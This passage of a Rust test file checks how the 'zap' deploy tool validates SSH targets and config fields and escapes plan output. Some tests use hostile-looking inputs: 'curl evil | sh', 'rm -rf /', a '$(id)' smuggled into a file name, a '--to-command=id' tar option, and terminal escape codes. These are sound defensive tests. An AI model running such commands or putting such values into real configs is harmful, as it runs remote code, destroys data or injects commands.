/// `scp`'s host early, are refused — by field, the value never quoted.
#[test]
fn build_ssh_refuses_a_destination_that_names_another_account_or_machine() {
    let _env = crate::resolve::test_env::set(&[("ZAP_T_HOST_AT", "root@box.example")]);
    for host in [
        serde_json::json!("root@box.example"),
        serde_json::json!("ssh://root@box.example:2222"),
        serde_json::json!({"$env": "ZAP_T_HOST_AT"}),
    ] {
        for user in [None, Some("deploy")] {
            let mut wire = serde_json::json!({"host": host});
            if let Some(user) = user {
                wire["user"] = serde_json::json!(user);
            }
            let Err(Error::Config(message)) = build_ssh(&remote_target(wire), false) else {
                panic!("expected an Error::Config for a host holding `@`");
            };
            assert!(message.contains("host resolves to a value holding `@`"));
            assert!(!message.contains("box.example"), "{message}");
        }
    }
    let target = remote_target(serde_json::json!({"host": "example.com", "user": "a:b"}));
    let Err(Error::Config(message)) = build_ssh(&target, false) else {
        panic!("expected an Error::Config for a user holding `:`");
    };
    assert!(message.contains("connecting user resolves to a value holding `:`"));
    // An IPv6 literal is a host, written bare, and an account may hold `@`.
    let v6 = remote_target(serde_json::json!({"host": "::1", "user": "a@b"}));
    assert_eq!(build_ssh(&v6, false).unwrap().host, "::1");
    for bracketed in ["[::1]", "[fe80::1", "host]"] {
        let target = remote_target(serde_json::json!({"host": bracketed, "user": "deploy"}));
        let Err(Error::Config(message)) = build_ssh(&target, false) else {
            panic!("expected an Error::Config for the host {bracketed}");
        };
        assert!(
            message.contains("holding `[` or `]`") && !message.contains(bracketed),
            "{message}"
        );
    }
}

/// A host or a user that resolves to a value holding a reference delimiter names no
/// machine and no account, and is refused before a connection is built — named by
/// its field, never by the value.
#[test]
fn build_ssh_refuses_a_destination_holding_a_reference_delimiter() {
    let _env = crate::resolve::test_env::set(&[
        ("ZAP_T_MARKED", &zap_types::var_ref::marker("ZAP_T_OTHER")),
        ("ZAP_T_HALF", &format!("half{}", zap_types::var_ref::CLOSE)),
    ]);
    for name in ["ZAP_T_MARKED", "ZAP_T_HALF"] {
        for (target, field) in [
            (serde_json::json!({"host": Text::reference(name)}), "host"),
            (
                serde_json::json!({"host": "example.com", "user": Text::reference(name)}),
                "connecting user",
            ),
        ] {
            let Err(Error::Config(message)) = build_ssh(&remote_target(target), false) else {
                panic!("expected an Error::Config for a {field} holding a delimiter");
            };
            assert!(
                message.contains(field) && message.contains("holding a reference delimiter"),
                "{message}"
            );
            assert!(!message.contains("ZAP_T_OTHER") && !message.contains("half"));
        }
    }
}

/// `$$NAME$$` is text — a shell's `$$`, SQL dollar quoting — in a field that takes
/// a reference and in one that takes none: a config that holds it parses as
/// written, passes the gates, names no variable, and reaches each command, path,
/// `env` value and template variable as it was written, whatever a variable of
/// that name holds.
#[test]
fn text_between_doubled_dollars_reaches_the_plan_as_written() {
    use crate::resource::execute::{ChangeCommands, StepAction, change_commands};
    use zap_types::detected::Detection;
    use zap_types::schema::{FileContent, ResourceKind};

    let _env = crate::resolve::test_env::set(&[
        ("hello", "SUBSTITUTED"),
        ("pid", "SUBSTITUTED"),
        ("_", "SUBSTITUTED"),
        ("V", "SUBSTITUTED"),
        ("APP_DIR", "SUBSTITUTED"),
        ("DEPLOY_DOMAIN", "SUBSTITUTED"),
        ("NESTED", "SUBSTITUTED"),
        ("SECRET_TOKEN", "SUBSTITUTED"),
    ]);
    let wire = serde_json::json!({
        "target": {"local": true, "service_manager": "systemd"},
        "resources": [
            {"id": "sql", "type": "script", "check": "test -e /run/x.$$",
             "run": "psql -c 'select $$hello$$'", "env": {"K": "$$V$$ $$SECRET_TOKEN$$"}},
            {"id": "pid", "type": "script", "check": "kill -0 $$pid$$",
             "run": "echo $$_$$ $$DEPLOY_DOMAIN$$ > /run/x.$$"},
            {"id": "data", "type": "directory", "path": "/srv/$$APP_DIR$$/data"},
            {"id": "site", "type": "file", "path": "/etc/nginx/$$DEPLOY_DOMAIN$$.conf",
             "content": {"type": "template", "template": "{{name}} {{upstream}} $$hello$$",
                         "vars": {"name": "$$DEPLOY_DOMAIN$$",
                                  "upstream": {"hosts": ["$$NESTED$$"]}}}},
            {"id": "u", "type": "user", "username": "deploy",
             "ssh_keys": {"keys": ["ssh-ed25519 AAAA $$hello$$"]},
             "sudo": {"mode": "nopasswd", "commands": ["/usr/bin/$$hello$$"]}},
        ],
        "deploy": {"artifacts": ["build/"], "path": "/srv/$$APP_DIR$$",
                   "health": {"domain": "$$DEPLOY_DOMAIN$$", "path": "/$$hello$$"}},
    });
    let config = ZapConfig::from_wire_value(&wire).unwrap();
    assert_eq!(
        serde_json::to_value(&config).unwrap()["resources"],
        wire["resources"]
    );
    validate_config_structure(&config).unwrap();
    assert_eq!(
        crate::secret::scan_env_var_names(&config),
        std::collections::BTreeSet::new()
    );
    assert_eq!(unresolved_env_message(&config), None);

    let detected = config
        .resources
        .iter()
        .map(|resource| (resource.id.clone(), Detection::Absent))
        .collect();
    let plan = zap_types::plan::diff(zap_types::plan::DiffInputs {
        resources: &config.resources,
        detected: &detected,
        target: &config.target,
        machine: &local_machine(),
        lock: None,
        pending: &std::collections::BTreeMap::new(),
        var: &zap_types::last_run::ReportVar::unset,
    })
    .plan;
    assert!(crate::resource::refused_changes(&plan).is_empty());
    let change = |id: &str| {
        plan.changes
            .iter()
            .find(|change| change.resource_id.0 == id)
            .unwrap_or_else(|| panic!("no change for `{id}`"))
    };
    let runs = |id: &str| match change_commands(change(id)).unwrap() {
        ChangeCommands::Steps { steps, options } => (
            steps
                .into_iter()
                .map(|step| match step.action {
                    StepAction::Run(text) => text,
                    StepAction::Put { command, .. } => command,
                })
                .collect::<Vec<_>>(),
            options.env,
        ),
        other => panic!("`{id}`: {other:?}"),
    };
    assert_eq!(
        runs("sql"),
        (
            vec!["psql -c 'select $$hello$$'".to_owned()],
            vec![("K".to_owned(), "$$V$$ $$SECRET_TOKEN$$".to_owned())]
        )
    );
    assert_eq!(runs("pid").0, ["echo $$_$$ $$DEPLOY_DOMAIN$$ > /run/x.$$"]);
    let ResourceKind::Directory(data) = &change("data").desired.kind else {
        panic!("a directory");
    };
    assert_eq!(
        crate::resolve::resolve_env_vars(&data.path),
        "/srv/$$APP_DIR$$/data"
    );
    let ResourceKind::File(site) = &change("site").desired.kind else {
        panic!("a file");
    };
    assert_eq!(
        crate::resolve::resolve_env_vars(&site.path),
        "/etc/nginx/$$DEPLOY_DOMAIN$$.conf"
    );
    let FileContent::Template(template) = &site.content else {
        panic!("a template");
    };
    assert_eq!(
        template.render(crate::resolve::resolve_env_vars),
        r#"$$DEPLOY_DOMAIN$$ {"hosts":["$$NESTED$$"]} $$hello$$"#
    );
}

#[test]
fn the_structure_gate_rejects_a_reserved_env_name_and_a_relative_cwd() {
    let reserved = config(&serde_json::json!([
        {"id": "s", "type": "script", "check": "c", "run": "r", "env": {"__zap_n": "1"}},
    ]));
    let Err(Error::Config(reserved)) = validate_config_structure(&reserved) else {
        panic!("expected the structure gate to reject the reserved env name");
    };
    assert!(reserved.contains("`env.__zap_n`"), "{reserved}");
    let relative = config(&serde_json::json!([
        {"id": "s", "type": "script", "check": "c", "run": "r", "cwd": "srv/app"},
    ]));
    let Err(Error::Config(relative)) = validate_config_structure(&relative) else {
        panic!("expected the structure gate to reject the working directory");
    };
    assert!(
        relative.contains("resource `s`: `cwd` is not an absolute path"),
        "{relative}"
    );
}

/// The gate rejects a `deploy.path` that isn't absolute, before any connection: the
/// release would otherwise be refused at its upload, after the build.
#[test]
fn the_structure_gate_rejects_a_relative_deploy_path() {
    let mut relative = config(&serde_json::json!([]));
    relative.deploy = Some(
        serde_json::from_value(serde_json::json!({"artifacts": ["build/"], "path": "app"}))
            .unwrap(),
    );
    let Err(Error::Config(message)) = validate_config_structure(&relative) else {
        panic!("expected the structure gate to reject the relative path");
    };
    assert!(
        message.contains("`deploy.path` is not an absolute path"),
        "{message}"
    );
}

/// The gate rejects a `deploy.shared` entry that names no file under `shared/`, and an
/// artifact `tar` would read as an option — before any connection and any build —
/// each finding one line whatever the entry holds; a deploy block with ordinary
/// names passes.
#[test]
fn the_structure_gate_rejects_an_unusable_shared_entry_and_artifact() {
    let deploy = |artifacts: &[&str], shared: &[&str]| {
        let mut config = config(&serde_json::json!([]));
        config.deploy = Some(
            serde_json::from_value(serde_json::json!(
                {"artifacts": artifacts, "path": "/srv/app", "shared": shared}
            ))
            .unwrap(),
        );
        config
    };
    validate_config_structure(&deploy(
        &["build/", "package.json"],
        &[".env.production", "config/app.env", "my file.env"],
    ))
    .unwrap();
    let Err(Error::Config(message)) = validate_config_structure(&deploy(
        &["build/", "--to-command=id"],
        &["ok.env", "a\"\n  - forged: $(id)", "../.env"],
    )) else {
        panic!("expected the structure gate to reject the entries");
    };
    assert_eq!(
        message,
        "config has 3 structural error(s):\n  \
         - `deploy.shared[1]` (`a\"<U+000A>  - forged: $(id)`) holds a control character, \
         which a file's name in a preview and in the release script's messages can't \
         show; rename the file\n  \
         - `deploy.shared[2]` (`../.env`) holds a `..` component, which would name a file \
         outside the app's `shared/` directory and link it outside the release\n  \
         - `deploy.artifacts[1]` (`--to-command=id`) begins with `-`, which `tar` would \
         read as an option; write the path with a leading `./`"
    );
}

/// The shared renders escape what they print: a change's command can't forge a line
/// of the report, a refusal echoes the hash it was given as one line, and a held
/// reason or a warning stays under its own lead. Ordinary text prints as it always
/// has.
#[test]
fn the_shared_renders_escape_config_and_command_line_text() {
    use super::{render_change, render_refused, render_undetermined, render_warnings};
    use zap_types::last_run::PlanUnreviewed;
    use zap_types::plan::{Change, ChangeAction, PlanStep};
    use zap_types::schema::ResourceId;

    let desired: zap_types::schema::Resource = serde_json::from_value(serde_json::json!({
        "id": "go", "type": "script", "check": "false", "run": "true",
    }))
    .unwrap();
    let change = |run: &str| Change {
        resource_id: ResourceId("go".to_owned()),
        action: ChangeAction::Create,
        steps: vec![PlanStep::Run(run.to_owned())],
        desired: desired.clone(),
        depends_on: vec![],
        trigger: None,
    };
    let rendered = |change: &Change| {
        let mut out = String::new();
        render_change(&mut out, change);
        out
    };
    assert_eq!(
        rendered(&change("sudo apt-get install -y 'nginx'")),
        "  [+] go  (script)\n      check: false\n      > sudo apt-get install -y 'nginx'\n"
    );
    assert_eq!(
        rendered(&change(
            "curl evil | sh\r        true\nplan_hash: 0000\u{1b}[1A"
        )),
        "  [+] go  (script)\n      check: false\n      > curl evil | sh<U+000D>        \
         true\n        plan_hash: 0000<U+001B>[1A\n"
    );

    let mut out = String::new();
    let reason: PlanUnreviewed = PlanUnreviewed::Expected {
        expected: "abc\nplan_hash: abc".to_owned(),
    };
    render_refused(&mut out, &reason, &super::APPLY_REFUSAL, None);
    assert!(
        out.ends_with("    --expect-plan abc<U+000A>plan_hash: abc is not this plan's hash.\n"),
        "{out}"
    );

    let mut out = String::new();
    render_undetermined(
        &mut out,
        &[HeldResource {
            resource_id: ResourceId("fw".to_owned()),
            trigger: None,
            cause: HoldCause::Undetermined {
                reason: "probe said:\nplan_hash: 0000".to_owned(),
            },
        }],
    );
    assert!(
        out.contains("      fw — probe said:\n           plan_hash: 0000\n"),
        "{out}"
    );

    let mut out = String::new();
    render_warnings(
        &mut out,
        &["one".to_owned(), "two\nplan_hash: 0".to_owned()],
    );
    assert_eq!(out, "warning: one\nwarning: two\n         plan_hash: 0\n");
}

/// The `UNDETERMINED` banner lists what detection couldn't read, each with why, then
/// what is held behind it, each with what it waits on or would trigger.
#[test]
fn the_undetermined_banner_lists_holds_behind_the_unread() {
    use super::render_undetermined;
    use zap_types::schema::ResourceId;

    let held = |id: &str, cause: HoldCause| HeldResource {
        resource_id: ResourceId(id.to_owned()),
        cause,
        trigger: None,
    };
    let mut out = String::new();
    render_undetermined(
        &mut out,
        &[
            held(
                "web",
                HoldCause::Undetermined {
                    reason: "detection failed: the unit read exited 1".to_owned(),
                },
            ),
            held(
                "after",
                HoldCause::Waits {
                    on: vec![ResourceId("web".to_owned())],
                },
            ),
            held(
                "site",
                HoldCause::Triggers {
                    service: ResourceId("web".to_owned()),
                    kind: TriggerKind::Reload,
                },
            ),
        ],
    );
    assert_eq!(
        out,
        "  UNDETERMINED — 1 resource(s) could not be probed, so no change is planned for \
         them and this changeset is partial:
      web — detection failed: the unit read exited 1
  their live state is unknown: neither converged nor drifted. resolve the probe failure \
         and re-run.
  held behind them — 2 resource(s) can't change until they do:
      after — waits on `web`, which is held
      site — would reload `web`, which is held
"
    );
}

/// A script change shows where and with what its command runs, above the command:
/// the `cwd` and each `env` variable as declared — a reference stays a reference —
/// then its `check`. A build shows its source and output above them. No value, and
/// no command text, can put a line where one of zap's own starts.
/// A put of text the plan holds prints the text under `text:` without the newline
/// it ends with, and says so in the header when it ends with none — the two
/// differ by more than their digests.
#[test]
fn a_text_put_says_when_its_text_has_no_final_newline() {
    use super::render_steps;
    use zap_types::plan::{Change, ChangeAction};

    let rendered = |content: &str| {
        let desired: zap_types::schema::Resource = serde_json::from_value(
            serde_json::json!({"id": "u", "type": "user", "username": "deploy"}),
        )
        .unwrap();
        let change = Change {
            resource_id: desired.id.clone(),
            action: ChangeAction::Create,
            steps: vec![
                serde_json::from_value(serde_json::json!({"put": {
                    "path": "/etc/x", "run_as": "root", "check": "none",
                    "source": {"text": {"mode": "600", "content": content}},
                }}))
                .unwrap(),
            ],
            desired,
            depends_on: vec![],
            trigger: None,
        };
        let mut out = String::new();
        render_steps(&mut out, &change);
        out
    };
    assert_eq!(
        rendered("a\nb\n"),
        "      = put /etc/x  (mode 600, as root; 4 bytes, sha512 a10ae0008f11be07…)\n          \
         text: a\n                b\n"
    );
    assert_eq!(
        rendered("a\nb"),
        "      = put /etc/x  (mode 600, as root; 3 bytes, sha512 377f7c6560b237d3…, no final \
         newline)\n          text: a\n                b\n"
    );
}

#[test]
fn a_script_change_renders_its_cwd_and_env_above_its_command() {
    use super::render_change;
    use zap_types::plan::{Change, ChangeAction, PlanStep};

    let change = |cwd: Option<&str>, env: serde_json::Value, run: &str| {
        let desired: zap_types::schema::Resource = serde_json::from_value(serde_json::json!({
            "id": "go", "type": "script", "check": "false", "run": run,
            "cwd": cwd, "env": env,
        }))
        .unwrap();
        let change = Change {
            resource_id: desired.id.clone(),
            action: ChangeAction::Create,
            steps: vec![PlanStep::Run(run.to_owned())],
            desired,
            depends_on: vec![],
            trigger: None,
        };
        let mut out = String::new();
        render_change(&mut out, &change);
        out
    };
    assert_eq!(
        change(
            Some("/srv/my app"),
            serde_json::json!({
                "TOKEN": Text::of_pieces([Lit("Bearer "), Ref("DEPLOY_TOKEN")]),
                "MODE": "it's prod",
            }),
            "./migrate.sh",
        ),
        format!(
            "  [+] go  (script)\n      cwd: /srv/my app\n      env: MODE=it's prod\n      \
             env: TOKEN=Bearer {}\n      check: false\n      > ./migrate.sh\n",
            shown("DEPLOY_TOKEN")
        )
    );
    assert_eq!(
        change(Some("/srv/app"), serde_json::Value::Null, "make"),
        "  [+] go  (script)\n      cwd: /srv/app\n      check: false\n      > make\n"
    );
    assert_eq!(
        change(None, serde_json::json!({"MODE": ""}), "make"),
        "  [+] go  (script)\n      env: MODE=\n      check: false\n      > make\n"
    );
    assert_eq!(
        change(None, serde_json::Value::Null, "make"),
        "  [+] go  (script)\n      check: false\n      > make\n"
    );
    // A build shows its declared cwd and env the same way.
    let build: zap_types::schema::Resource = serde_json::from_value(serde_json::json!({
        "id": "tool", "type": "build", "run": "make install", "output": "/opt/tool",
        "cwd": "/opt/src", "env": {"CC": "clang", "KEY": Text::reference("BUILD_KEY")},
        "source": {"type": "remote", "url": "https://h/x.tar.gz",
            "extract": {"type": "tar.gz"}},
    }))
    .unwrap();
    let mut out = String::new();
    render_change(
        &mut out,
        &Change {
            resource_id: build.id.clone(),
            action: ChangeAction::Create,
            steps: vec![PlanStep::Run("make install".to_owned())],
            desired: build,
            depends_on: vec![],
            trigger: None,
        },
    );
    assert_eq!(
        out,
        format!(
            "  [+] tool  (build)\n      source: fetched from https://h/x.tar.gz\n      \
             extract: tar.gz\n      pin: none yet (tracked in zap.lock)\n      output: \
             /opt/tool\n      cwd: /opt/src\n      env: CC=clang\n      env: KEY={}\n      > \
             make install\n",
            shown("BUILD_KEY")
        )
    );
    // A multi-line value, cwd, or command stays under its own lead; a command's
    // second line can't read as a `cwd:` or `env:` line.
    assert_eq!(
        change(
            Some("/srv\n      cwd: /elsewhere"),
            serde_json::json!({"A": "x\n      > rm -rf /\u{1b}[1A"}),
            "make\n      cwd: /elsewhere\nenv: A=y",
        ),
        "  [+] go  (script)\n      cwd: /srv\n                 cwd: /elsewhere\n      \
         env: A=x\n                   > rm -rf /<U+001B>[1A\n      check: false\n      > \
         make\n              cwd: /elsewhere\n        env: A=y\n"
    );
}

/// A change shows what it declares under its header, as declared: a file's path,
/// attributes and what its content is (never the content), a directory's, where a
/// link points, a build's source and output, the `check` detection runs, what a
/// service restarts on. A kind whose steps say it all adds nothing.
#[test]
fn a_change_shows_what_it_declares() {
    use super::render_change;
    use zap_types::plan::{Change, ChangeAction};

    let declared = |desired: serde_json::Value| {
        let desired: zap_types::schema::Resource = serde_json::from_value(desired).unwrap();
        let mut out = String::new();
        render_change(
            &mut out,
            &Change {
                resource_id: desired.id.clone(),
                action: ChangeAction::Create,
                steps: vec![],
                desired,
                depends_on: vec![],
                trigger: None,
            },
        );
        out
    };
    assert_eq!(
        declared(serde_json::json!({
            "id": "hello", "type": "file", "path": "/etc/sudoers.d/x",
            "content": {"type": "inline", "content": "hello from zap\n"},
        })),
        "  [+] hello  (file)\n      path: /etc/sudoers.d/x\n      content: inline (15 bytes, \
         sha512 0c7463f032f1dc98…)\n"
    );
    // Another content of the same length is another digest.
    assert!(
        declared(serde_json::json!({
            "id": "hello", "type": "file", "path": "/etc/sudoers.d/x",
            "content": {"type": "inline", "content": "hello from zap!"},
        }))
        .contains("inline (15 bytes, sha512 ")
    );
    assert_ne!(
        declared(serde_json::json!({
            "id": "hello", "type": "file", "path": "/p",
            "content": {"type": "inline", "content": "hello from zap!"},
        })),
        declared(serde_json::json!({
            "id": "hello", "type": "file", "path": "/p",
            "content": {"type": "inline", "content": "hello from zap?"},
        }))
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "site", "type": "file", "path": "~/site.conf", "mode": "640",
            "owner": "app", "group": "www",
            "content": {"type": "template", "template": "listen {{port}};",
                "vars": {"port": Text::reference("PORT")}},
            "validate": "nginx -t -c %s", "triggers": ["nginx", "php"],
        })),
        format!(
            "  [+] site  (file)\n      path: ~/site.conf\n      mode: 640\n      owner: \
             app\n      group: www\n      content: template (16 bytes, sha512 \
             31dd285f4f61498d…), vars {}\n      validate: nginx -t -c %s\n      triggers: \
             nginx, php\n",
            serde_json::json!({"port": Text::reference("PORT")})
        )
    );
    // The kinds its variables must render to follow them, as declared.
    assert!(
        declared(serde_json::json!({
            "id": "site", "type": "file", "path": "/site.conf",
            "content": {"type": "template", "template": "server_name {{domain}};",
                "vars": {"domain": "example.com"}, "kinds": {"domain": "hostname"}},
        }))
        .contains("…), vars {\"domain\":\"example.com\"}, kinds {\"domain\":\"hostname\"}\n"),
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "key", "type": "file", "path": "/etc/key",
            "content": {"type": "source",
                "path": Text::of_pieces([Lit("./keys/"), Ref("HOST"), Lit(".pub")])},
        })),
        format!(
            "  [+] key  (file)\n      path: /etc/key\n      content: copied from \
             ./keys/{}.pub\n",
            shown("HOST")
        )
    );
    let pin = "ab".repeat(32);
    assert_eq!(
        declared(serde_json::json!({
            "id": "zig", "type": "file", "path": "/opt/zig",
            "content": {"type": "remote",
                "url": Text::of_pieces([Lit("https://h/"), Ref("V"), Lit("/zig.tar.xz")]),
                "blake3": pin, "extract": {"type": "tar.xz", "strip_components": 1},
                "auth": {"scheme": "bearer", "token": Text::reference("FORGE_TOKEN")}},
        })),
        format!(
            "  [+] zig  (file)\n      path: /opt/zig\n      content: fetched from \
             https://h/{}/zig.tar.xz\n      extract: tar.xz, strip 1\n      pin: blake3 \
             {pin}\n      auth: bearer {}\n",
            shown("V"),
            shown("FORGE_TOKEN")
        )
    );
    // An unpinned, unextracted fetch; a credential's literal text is never printed.
    assert_eq!(
        declared(serde_json::json!({
            "id": "blob", "type": "file", "path": "/opt/blob",
            "content": {"type": "remote", "url": "https://h/blob",
                "auth": {"scheme": "bearer",
                    "token": Text::of_pieces([Lit("hunter2-"), Ref("SUFFIX")])}},
        })),
        format!(
            "  [+] blob  (file)\n      path: /opt/blob\n      content: fetched from \
             https://h/blob\n      pin: none yet (tracked in zap.lock)\n      auth: bearer \
             (literal){}\n",
            shown("SUFFIX")
        )
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "notes", "type": "directory", "path": "~/notes", "mode": "755",
        })),
        "  [+] notes  (directory)\n      path: ~/notes\n      mode: 755\n"
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "current", "type": "link", "path": "/srv/current",
            "target": "/srv/releases/1",
        })),
        "  [+] current  (link)\n      path: /srv/current\n      to: /srv/releases/1\n"
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "tool", "type": "build", "run": "make", "output": "/opt/tool",
            "source": {"type": "remote", "url": "https://h/x.tar.gz", "blake3": pin,
                "extract": {"type": "tar.gz"},
                "verify": {"scheme": "minisign", "public_key": "RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3",
                    "signature_url": "https://h/x.minisig"}},
        })),
        format!(
            "  [+] tool  (build)\n      source: fetched from https://h/x.tar.gz\n      \
             extract: tar.gz\n      pin: blake3 {pin}\n      verify: minisign RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3\n      \
             signature: https://h/x.minisig\n      output: /opt/tool\n"
        )
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "rg", "type": "package", "from": {"apt": "ripgrep"},
            "check": "command -v rg",
        })),
        "  [+] rg  (package)\n      check: command -v rg\n"
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "rg", "type": "package", "from": {"apt": "ripgrep"},
        })),
        "  [+] rg  (package)\n"
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "uv", "type": "installer", "url": "https://h/install.sh",
            "check": "command -v uv",
        })),
        "  [+] uv  (installer)\n      check: command -v uv\n"
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "web", "type": "service", "service": "nginx", "enabled": true,
            "restart_on": ["unit"], "reload_on": ["site", "tls"],
        })),
        "  [+] web  (service)\n      restart_on: unit\n      reload_on: site, tls\n"
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "swap", "type": "swap", "size": "1G",
        })),
        "  [+] swap  (swap)\n      size: 1G\n"
    );
    assert_eq!(
        declared(serde_json::json!({
            "id": "fw", "type": "firewall", "backend": "ufw",
            "default_incoming": "deny", "default_outgoing": "allow", "allow": [],
        })),
        "  [+] fw  (firewall)\n"
    );
}

/// A change's `name` is its first declared line, under the header and any trigger line,
/// and a change without one has no such line; a pipeline lists each step by its `id`,
/// with its `name` when it has one, above the `>` lines of its `run`s.
#[test]
fn a_change_shows_its_name_and_a_pipelines_steps() {
    use super::render_change;
    use zap_types::plan::{Change, ChangeAction, PlanStep, Trigger, TriggerKind};
    use zap_types::schema::ResourceId;

    let rendered = |desired: serde_json::Value, steps: Vec<PlanStep>, trigger| {
        let desired: zap_types::schema::Resource = serde_json::from_value(desired).unwrap();
        let mut out = String::new();
        render_change(
            &mut out,
            &Change {
                resource_id: desired.id.clone(),
                action: ChangeAction::Update,
                steps,
                desired,
                depends_on: vec![],
                trigger,
            },
        );
        out
    };
    assert_eq!(
        rendered(
            serde_json::json!({
                "id": "motd", "name": "Login banner", "type": "file", "path": "/etc/motd",
                "content": {"type": "source", "path": "./motd"},
            }),
            vec![],
            None,
        ),
        "  [~] motd  (file)\n      name: Login banner\n      path: /etc/motd\n      \
         content: copied from ./motd\n"
    );
    assert_eq!(
        rendered(
            serde_json::json!({
                "id": "motd", "type": "file", "path": "/etc/motd",
                "content": {"type": "source", "path": "./motd"},
            }),
            vec![],
            None,
        ),
        "  [~] motd  (file)\n      path: /etc/motd\n      content: copied from ./motd\n"
    );
    assert_eq!(
        rendered(
            serde_json::json!({
                "id": "web", "name": "The web server", "type": "service", "service": "nginx",
                "enabled": true, "restart_on": ["unit"],
            }),
            vec![PlanStep::run("sudo systemctl restart nginx")],
            Some(Trigger {
                kind: TriggerKind::Restart,
                sources: vec![ResourceId("unit".to_owned())],
                pending: false,
            }),
        ),
        "  [~] web  (service)\n      (triggered restart)\n      name: The web server\n      \
         restart_on: unit\n      > sudo systemctl restart nginx\n"
    );
    assert_eq!(
        rendered(
            serde_json::json!({
                "id": "release", "name": "Release", "type": "pipeline",
                "max_concurrency": 1,
                "steps": [
                    {"id": "migrate", "name": "Run migrations", "run": "./migrate up"},
                    {"id": "warm", "run": "curl -fsS http://localhost/ready"},
                ],
            }),
            vec![
                PlanStep::run("./migrate up"),
                PlanStep::run("curl -fsS http://localhost/ready"),
            ],
            None,
        ),
        "  [~] release  (pipeline)\n      name: Release\n      max_concurrency: 1\n      \
         step: migrate\n      step name: Run migrations\n      step: warm\n      > ./migrate up\n      \
         > curl -fsS http://localhost/ready\n"
    );
}

/// A label — a resource's `name`, a step's `id` or `name` — is one escaped line after
/// its key: text in it that spells a change header, a trigger line, a step, or another
/// label stays on that line.
#[test]
fn a_label_cannot_forge_a_line() {
    use super::render_change;
    use zap_types::plan::{Change, ChangeAction};

    let header = "x\n  [~] x  (file)";
    let trigger = "y\n      (triggered reload)";
    let desired: zap_types::schema::Resource = serde_json::from_value(serde_json::json!({
        "id": "p", "name": format!("{header}\u{1b}[2K\u{202e}"), "type": "pipeline",
        "steps": [
            {"id": format!("{trigger}\n      step name: z"), "name": "a\n      > rm -rf /",
                "run": "true"},
            {"id": "[~] q  (file)", "name": "(triggered reload)", "run": "true"},
        ],
    }))
    .unwrap();
    let mut out = String::new();
    render_change(
        &mut out,
        &Change {
            resource_id: desired.id.clone(),
            action: ChangeAction::Create,
            steps: vec![],
            desired,
            depends_on: vec![],
            trigger: None,
        },
    );
    assert_eq!(
        out,
        "  [+] p  (pipeline)\n      name: x<U+000A>  [~] x  (file)<U+001B>[2K<U+202E>\n      \
         step: y<U+000A>      (triggered reload)<U+000A>      step name: z\n      \
         step name: a<U+000A>      > rm -rf /\n      step: [~] q  (file)\n      \
         step name: (triggered reload)\n"
    );
}

/// The declared lines are config text like the steps: a path, a check, or a url
/// that runs to several lines stays a block under its own key, a credential prints
/// none of its literal text, and a template's variables are one line.
// `{env:NAME}` is the notation a reference is shown in, written out here as text.
#[allow(clippy::literal_string_with_formatting_args)]
#[test]
fn a_declared_line_cannot_forge_another() {
    use super::render_change;
    use zap_types::plan::{Change, ChangeAction};

    let desired: zap_types::schema::Resource = serde_json::from_value(serde_json::json!({
        "id": "f", "type": "file", "path": "/a\n      mode: 777\rx",
        "content": {"type": "remote", "url": "https://h/x\n      pin: blake3 00",
            "auth": {"scheme": "bearer", "token": Text::of_pieces([
                Lit("tok\n      path: /b"), Ref("A"), Lit("\n      path: /c"),
            ])}},
        "validate": "true\n      > rm -rf /",
        "triggers": ["svc\n      triggers: other"],
    }))
    .unwrap();
    let mut out = String::new();
    render_change(
        &mut out,
        &Change {
            resource_id: desired.id.clone(),
            action: ChangeAction::Update,
            steps: vec![],
            desired,
            depends_on: vec![],
            trigger: None,
        },
    );
    assert_eq!(
        out,
        "  [~] f  (file)\n      path: /a\n                  mode: 777<U+000D>x\n      content: \
         fetched from https://h/x\n                                  pin: blake3 00\n      \
         pin: none yet (tracked in zap.lock)\n      auth: bearer (literal){env:A}(literal)\n      \
         validate: true\n                      > rm -rf /\n      triggers: \
         svc<U+000A>      triggers: other\n"
    );
    let template: zap_types::schema::Resource = serde_json::from_value(serde_json::json!({
        "id": "t", "type": "file", "path": "/t",
        "content": {"type": "template", "template": "x",
            "vars": {"k\u{202e}": "v\n      path: /b\u{1b}[1A"}},
    }))
    .unwrap();
    let mut out = String::new();
    super::render_declared(&mut out, &template);
    assert!(
        out.ends_with("), vars {\"k<U+202E>\":\"v\\n      path: /b\\u001b[1A\"}\n"),
        "{out}"
    );
    assert_eq!(out.lines().count(), 2, "{out}");
}

/// `apply`'s refusal, word for word, for each banner over each reason: the banner says
/// what follows for this run and the line under it why, so no cell says a plan was
/// reviewed that its reason says never was. A recorded time or hash read back from disk
/// is escaped like any other text.
#[test]
fn the_apply_refusal_reads_true_for_each_banner_and_reason() {
    use super::{APPLY_REFUSAL, Confirmation, render_refused};
    use zap_types::last_run::{PlanUnreviewed, RunCommand};

    let rendered = |reason: &PlanUnreviewed, confirmation: Option<Confirmation>| {
        let mut out = String::new();
        render_refused(&mut out, reason, &APPLY_REFUSAL, confirmation);
        out
    };
    let banners = [
        (None, "REFUSED — nothing ran: this plan was not reviewed."),
        (
            Some(Confirmation::Asking),
            "UNREVIEWED — nothing has run: this plan runs only once it is confirmed below.",
        ),
        (
            Some(Confirmation::Declined),
            "DECLINED — nothing ran: this plan was not confirmed.",
        ),
    ];
    let reasons = [
        (
            PlanUnreviewed::Expected {
                expected: "abc".to_owned(),
            },
            "--expect-plan abc is not this plan's hash.",
        ),
        (
            PlanUnreviewed::NoPreview { prior: None },
            "no plan has been previewed on this host.",
        ),
        (
            PlanUnreviewed::NoPreview {
                prior: Some(RunCommand::DeployPreflight),
            },
            "the last run on this host (zap deploy --wetrun's drift preflight) previewed no \
             plan.",
        ),
        (
            PlanUnreviewed::Changed {
                reviewed: "abc".to_owned(),
                command: RunCommand::Apply,
                ran_at: "2026-09-28T12:00:00Z".to_owned(),
            },
            "the last preview (zap apply (dry run) at 2026-09-28T12:00:00Z) planned abc; the \
             config, the target, or the user the run connects as changed since.",
